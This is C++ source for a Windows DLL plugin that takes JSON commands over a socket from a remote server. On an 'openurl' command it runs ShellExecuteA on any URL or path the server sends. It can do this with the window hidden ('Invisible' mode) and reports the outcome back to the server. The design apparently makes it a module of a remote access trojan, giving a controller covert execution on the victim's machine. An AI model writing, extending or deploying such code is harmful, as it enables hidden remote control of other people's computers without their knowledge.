#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <string>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")

using json = nlohmann::json;
using namespace std;

// Function to safely send JSON to the server
static bool safe_send_json(SOCKET sock, const json& data) {
    try {
        string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
        string msg = serialized + "\r\n";
        int total = 0;
        int len = (int)msg.size();
        while (total < len) {
            int sent = send(sock, msg.c_str() + total, len - total, 0);
            if (sent == SOCKET_ERROR) return false;
            total += sent;
        }
        return true;
    } catch (...) {
        return false;
    }
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    // Basic plugin execution logic if needed
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        if (!commandJson) return;

        json command = json::parse(commandJson);
        string action = command.value("action", "");

        if (action == "openurl") {
            string url = command.value("url", "");
            string mode = command.value("mode", "Visible");

            if (url.empty()) {
                safe_send_json(sock, {
                    {"action", "openurl_response"},
                    {"status", "error"},
                    {"message", "URL is empty"}
                });
                return;
            }

            INT showMode = SW_SHOWNORMAL;
            if (mode == "Invisible") {
                showMode = SW_HIDE;
            }

            HINSTANCE res = ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, showMode);

            if ((INT_PTR)res > 32) {
                safe_send_json(sock, {
                    {"action", "openurl_response"},
                    {"status", "success"},
                    {"url", url},
                    {"mode", mode}
                });
            } else {
                string errorMsg = "ShellExecute failed (Code: " + to_string((INT_PTR)res) + ")";
                safe_send_json(sock, {
                    {"action", "openurl_response"},
                    {"status", "error"},
                    {"message", errorMsg}
                });
            }
        }
    } catch (const std::exception& e) {
        string excMsg = string("Plugin Exception: ") + e.what();
        safe_send_json(sock, {
            {"action", "openurl_response"},
            {"status", "error"},
            {"message", excMsg}
        });
    } catch (...) {
        safe_send_json(sock, {
            {"action", "openurl_response"},
            {"status", "error"},
            {"message", "Unknown Plugin Exception"}
        });
    }
}

BOOL APIENTRY DllMain(HMODULE, DWORD, LPVOID) { return TRUE; }
